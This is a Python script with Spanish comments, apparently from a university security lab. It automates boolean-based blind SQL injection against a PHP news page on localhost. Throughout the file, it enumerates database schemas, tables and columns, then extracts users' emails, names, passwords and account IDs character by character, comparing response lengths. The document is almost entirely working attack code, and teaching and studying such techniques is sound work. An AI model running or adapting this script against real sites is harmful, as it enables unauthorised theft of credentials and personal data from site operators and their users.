#!/usr/bin/python3

import requests, time, urllib3
import string
from termcolor import colored, cprint
from urllib.parse import quote

# Metodo utilizado para adivinar las columnas que tiene que devolver las consultas
def obtenerNumColumnas(url):
	for i in range(1,20):
        # Se incrementa en uno el order by hasta obtener una respuesta falsa, cuando se encuentre la consulta falsa el num columnas sera i-1
		urlColumnas = url+" order by %d"%i
		r = session.get(urlColumnas, verify=False)
		lengthUrlActual = int(r.headers['Content-Length'])
		if lengthCasoFalse == lengthUrlActual:
			break
	return i-1	

# Metodo que obtiene el numero de bases de datos existentes
def obtenerNumEsquemas(url):
	for i in range (1,30):
        # Se ejecutan consultas select count hasta que coincida con el numero i
		urlObtenerEsquemas = url+" and (select count(schema_name) from information_schema.schemata) = %d"%i
		r = session.get(urlObtenerEsquemas, verify=False)
        # Cuando se obtiene un content length igual al del caso true, se obtiene el numero total de esquemas
		lengthUrlActual = int(r.headers['Content-Length'])
		if lengthCasoTrue == lengthUrlActual:
			break
	return i
    
# Metodo que obtiene el tamano de los nombres de las bases de datos
def tamanoEsquemas(url,numEsquemas):
	caracteresPorDb = []
	for i in range(numEsquemas):
		for j in range(1,30):
            # Se van haciendo consultas al length limitando una a una las bases de datos que tiene que devolver
			urlObtenerLengthEsquemas= url+" and (select length(schema_name) from information_schema.schemata limit %d ,1) = %d"%(i,j)
			r = session.get(urlObtenerLengthEsquemas, verify=False)
			lengthUrlActual = int(r.headers['Content-Length'])
			if lengthCasoTrue == lengthUrlActual:
				caracteresPorDb.append(j)
				break
	return caracteresPorDb

# Metodo que obtiene los nombres de cada una de las bases de datos
def obtenerNombresBD(url,numEsquemas,caracteresPorEsquema):
	lista_nombres_bd=[]
	diccionario = string.ascii_lowercase+string.ascii_uppercase+string.digits+'-_ '
	for i in range(numEsquemas):
		nombre_db_cont=""
		for j in range(caracteresPorEsquema[i]+1):
			for char in (diccionario):
                # Se realizan consultas haciendo substring caracter por caracter de las diferentes bases de datos y comparandolos con los caracteres del diccionario hasta que
                # hay un resultado que coincide
				urlObtenerNombresbd=url+" and substring((select schema_name from information_schema.schemata limit %d , 1), %d , 1) = '%c'"%(i,j,char)
				r = session.get(urlObtenerNombresbd, verify=False)
				lengthUrlActual = int(r.headers['Content-Length'])
				if lengthCasoTrue == lengthUrlActual:
					nombre_db_cont=nombre_db_cont+str(char)
					break
        # Se guarda el nombre completo de todas las bases de datos sin espacios en blanco
		lista_nombres_bd.append(nombre_db_cont.replace(" ",""))
	return lista_nombres_bd

# Metodo que obtiene el numero de tablas existentes dentro de la BD 'UOC'
def obtenerNumTablas(url,bdPrincipal):
	for i in range (1,30):
		urlObtenerNumTablas = url+" and (select count(table_name) from information_schema.tables where table_schema = '%s') = %d"%(bdPrincipal,i)
		r = session.get(urlObtenerNumTablas, verify=False)
		lengthUrlActual = int(r.headers['Content-Length'])
		if lengthCasoTrue == lengthUrlActual:
			break
	return i

# Metodo que obtiene el tamano los nombres de las tablas existentes dentro de la BD 'UOC'
def tamanoTablas(url,numTablas,bdPrincipal):
	caracteresPorTabla = []
	for i in range(numTablas):
		for j in range(1,30):
			urlObtenerLengthTablas= url+" and (select length(table_name) from information_schema.tables where table_schema= '%s' limit %d ,1) = %d"%(bdPrincipal,i,j)
			r = session.get(urlObtenerLengthTablas, verify=False)
			lengthUrlActual = int(r.headers['Content-Length'])
			if lengthCasoTrue == lengthUrlActual:
				caracteresPorTabla.append(j)
				break
	return caracteresPorTabla

# Metodo que obtiene los nombres de las tablas existentes dentro de la BD 'UOC'
def obtenerNombresTablas(url,numTablas,caracteresPorTabla,bdPrincipal):
	lista_nombres_tabla=[]
	diccionario = string.ascii_lowercase+string.ascii_uppercase+string.digits+'-_ '
	for i in range(numTablas):
		nombre_tabla_cont=""
		for j in range(caracteresPorTabla[i]+1):
			for char in (diccionario):
				urlObtenerNombrestabla=url+" and substring((select table_name from information_schema.tables where table_schema= '%s' limit %d , 1), %d , 1) = '%c'"%(bdPrincipal,i,j,char)
				r = session.get(urlObtenerNombrestabla, verify=False)
				lengthUrlActual = int(r.headers['Content-Length'])
				if lengthCasoTrue == lengthUrlActual:
					nombre_tabla_cont=nombre_tabla_cont+str(char)
					break

		lista_nombres_tabla.append(nombre_tabla_cont.replace(" ",""))
	return lista_nombres_tabla

# Metodo que obtiene el numero de columnas dentro de la tabla Users
def obtenerNumColumnasTabla(url,tablaUsers):
	for i in range (1,30):
		urlObtenerNumColumnas = url+" and (select count(column_name) from information_schema.columns where table_name = '%s') = %d"%(tablaUsers,i)
		r = session.get(urlObtenerNumColumnas, verify=False)
		lengthUrlActual = int(r.headers['Content-Length'])
		if lengthCasoTrue == lengthUrlActual:
			break
	return i

# Metodo que obtiene la longitud de los nombres de las columnas que tiene la tabla Users
def tamanoColumnas(url,numColumnas,tablaUsers):
	caracteresPorColumna = []
	for i in range(numColumnas):
		for j in range(1,30):
			urlObtenerLengthColumnas= url+" and (select length(column_name) from information_schema.columns where table_name= '%s' limit %d ,1) = %d"%(tablaUsers,i,j)
			r = session.get(urlObtenerLengthColumnas, verify=False)
			lengthUrlActual = int(r.headers['Content-Length'])
			if lengthCasoTrue == lengthUrlActual:
				caracteresPorColumna.append(j)
				break
	return caracteresPorColumna

# Metodo que obtiene los nombres de las columnas de la tabla Users
def obtenerNombresColumnas(url,numColumnas,caracPorColumna,tablaUsers):
	lista_nombres_columna=[]
	diccionario = string.ascii_lowercase+string.ascii_uppercase+string.digits+'-_ '
	for i in range(numColumnas):
		nombre_columna_cont=""
		for j in range(caracPorColumna[i]+1):
			for char in (diccionario):
				urlObtenerNombrescolumna=url+" and substring((select column_name from information_schema.columns where table_name= '%s' limit %d , 1), %d , 1) = '%c'"%(tablaUsers,i,j,char)
				r = session.get(urlObtenerNombrescolumna, verify=False)
				lengthUrlActual = int(r.headers['Content-Length'])
				if lengthCasoTrue == lengthUrlActual:
					nombre_columna_cont=nombre_columna_cont+str(char)
					break

		lista_nombres_columna.append(nombre_columna_cont.replace(" ",""))
	return lista_nombres_columna

# Metodo que obtiene el numero de datos que alberga la columna que le indiquemos por parametro
def obtenerNumDatosColumna(url,columna):
	for i in range (1,30):
		urlObtenerNumDatosColumna = url+" and (select count(%s) from Users) = %d"%(columna,i)
		r = session.get(urlObtenerNumDatosColumna, verify=False)
		lengthUrlActual = int(r.headers['Content-Length'])
		if lengthCasoTrue == lengthUrlActual:
			break
	return i

# Metodo que obtiene la longitud de los datos que alberga la columna que le indiquemos por parametro
def tamanoDatosColumna(url,numDatos,columna):
	caracteresPorDato = []
	for i in range(numDatos):
		for j in range(1,30):
			urlObtenerLengthDatos= url+" and (select length(%s) from Users limit %d ,1) = %d"%(columna,i,j)
			r = session.get(urlObtenerLengthDatos, verify=False)
			lengthUrlActual = int(r.headers['Content-Length'])
			if lengthCasoTrue == lengthUrlActual:
				caracteresPorDato.append(j)
				break
	return caracteresPorDato

# Metodo que obtiene los datos que alberga la columna que le indiquemos por parametro
def obtenerNombresDatos(url,numDatos,caracPorDato,columna):
	lista_nombres_datos=[]
	diccionario = string.ascii_lowercase+string.ascii_uppercase+string.digits+'@-_ '
	for i in range(numDatos):
		nombre_datos_cont=""
		for j in range(caracPorDato[i]+1):
			for char in (diccionario):
				urlObtenerNombresdatos=url+" and substring((select %s from Users limit %d , 1), %d , 1) = '%c'"%(columna,i,j,char)
				r = session.get(urlObtenerNombresdatos, verify=False)
				lengthUrlActual = int(r.headers['Content-Length'])
				if lengthCasoTrue == lengthUrlActual:
					nombre_datos_cont=nombre_datos_cont+str(char)
					break

		lista_nombres_datos.append(nombre_datos_cont.replace(" ",""))
	return lista_nombres_datos

url = "http://localhost/webnoticias.php?id=1"

session = requests.Session()
# Esta URL se va a utilizar para obtener una rspuesta falsa de la aplicacion
urlFalse = "http://localhost/webnoticias.php?id=1 and 1=2"
# Obtenemos el length del resultado falso para poder compararlo con los resultados al hacer las consultas masivas
lengthCasoFalse = int(session.get(urlFalse,verify=False).headers['Content-Length'])
# Obtenemos el length del resultado verdadera para poder compararlo con los resultados al hacer las consultas masivas
lengthCasoTrue = int(session.get(url,verify=False).headers['Content-Length'])

numColumnas= obtenerNumColumnas(url)
print("Las consultas necesitan devolver el siguiente numero de columnas: ",numColumnas)

numEsquemas= obtenerNumEsquemas(url)
print("Hemos encontrado el siguiente numero de esquemas: ",numEsquemas)

caracteresPorEsquema= tamanoEsquemas(url,numEsquemas)
print("Cada esquema encontrado posee el siguiente numero de caracteres en el nombre: ",caracteresPorEsquema)

nombresDB = obtenerNombresBD(url,numEsquemas,caracteresPorEsquema)
print("Los nombres de las diferentes bd son los siguientes: ",nombresDB)

print("Nos llama la atencion el esquema 'UOC' vamos a intentar sacar las tablas que posee esa base de datos")
bdPrincipal = nombresDB[1].upper()
print("bdPrincipal: ",bdPrincipal)

numTablas = obtenerNumTablas(url,bdPrincipal)
print("Se ha encontrado el siguiente numero de tablas dentro del esquema 'UOC': ",numTablas)

caractPorTabla = tamanoTablas(url,numTablas,bdPrincipal)
print("Cada tabla del esquema 'UOC' tiene los siguientes caracteres: ",caractPorTabla)

nombresTablas = obtenerNombresTablas(url,numTablas,caractPorTabla,bdPrincipal)
print("Los nombres de las diferentes tablas son los siguientes: ",nombresTablas)

print("La tabla 'Users' es la que mas nos llama la atencion, vamos a intentar obtener las columnas de la tabla")
tablaUsers = nombresTablas[1].capitalize()
print(tablaUsers)

numColumnas = obtenerNumColumnasTabla(url,tablaUsers)
print("Se ha encontrado el siguiente numero de columnas dentro de la tabla 'Users': ",numColumnas)

caracPorColumna= tamanoColumnas(url,numColumnas,tablaUsers)
print("Cada columna de la tabla 'Users' tiene los siguientes caracteres: ",caracPorColumna)

nombresColumnas = obtenerNombresColumnas(url,numColumnas,caracPorColumna,tablaUsers)
print("Los nombres de las diferentes columnas son los siguientes: ",nombresColumnas)

print("Despues de obtener la base de datos, las tablas y las columnas, queda recoger los datos de las diferentes columnas, empezaremos por la columna 'email'")
columnaEmail = nombresColumnas[0].capitalize()
columnaNombre = nombresColumnas[1].capitalize()
columnaPassword = nombresColumnas[2].capitalize()
columnaIdaccount = nombresColumnas[3].capitalize()

numDatosEmail = obtenerNumDatosColumna(url,columnaEmail)
print("Se ha encontrado el siguiente numero de datos en la columna 'Email': ",numDatosEmail)

tamanoDatosEmail = tamanoDatosColumna(url,numDatosEmail,columnaEmail)
print("Cada datos de la columna 'Email' tiene los siguientes caracteres: ",tamanoDatosEmail)

datosColumnEmail = obtenerNombresDatos(url,numDatosEmail,tamanoDatosEmail,columnaEmail)
print("Los datos de la columna 'Email' son los siguientes: ",datosColumnEmail)

numDatosNombre = obtenerNumDatosColumna(url,columnaNombre)
print("Se ha encontrado el siguiente numero de datos en la columna 'Nombre': ",numDatosNombre)

tamanoDatosNombre = tamanoDatosColumna(url,numDatosNombre,columnaNombre)
print("Cada datos de la columna 'Nombre' tiene los siguientes caracteres: ",tamanoDatosNombre)

datosColumnNombre = obtenerNombresDatos(url,numDatosNombre,tamanoDatosNombre,columnaNombre)
print("Los datos de la columna 'Nombre' son los siguientes: ",datosColumnNombre)

numDatosPassword = obtenerNumDatosColumna(url,columnaPassword)
print("Se ha encontrado el siguiente numero de datos en la columna 'Password': ",numDatosPassword)

tamanoDatosPassword = tamanoDatosColumna(url,numDatosPassword,columnaPassword)
print("Cada datos de la columna 'Password' tiene los siguientes caracteres: ",tamanoDatosPassword)

datosColumnPassword = obtenerNombresDatos(url,numDatosPassword,tamanoDatosPassword,columnaPassword)
print("Los datos de la columna 'Password' son los siguientes: ",datosColumnPassword)

numDatosAccountId = obtenerNumDatosColumna(url,columnaIdaccount)
print("Se ha encontrado el siguiente numero de datos en la columna 'AccountId': ",numDatosAccountId)

tamanoDatosAccountId = tamanoDatosColumna(url,numDatosAccountId,columnaIdaccount)
print("Cada datos de la columna 'AccountId' tiene los siguientes caracteres: ",tamanoDatosAccountId)

datosColumnAccountId = obtenerNombresDatos(url,numDatosAccountId,tamanoDatosAccountId,columnaIdaccount)
print("Los datos de la columna 'AccountId' son los siguientes: ",datosColumnAccountId)

print("Todos los datos han sido extraidos con EXITO")
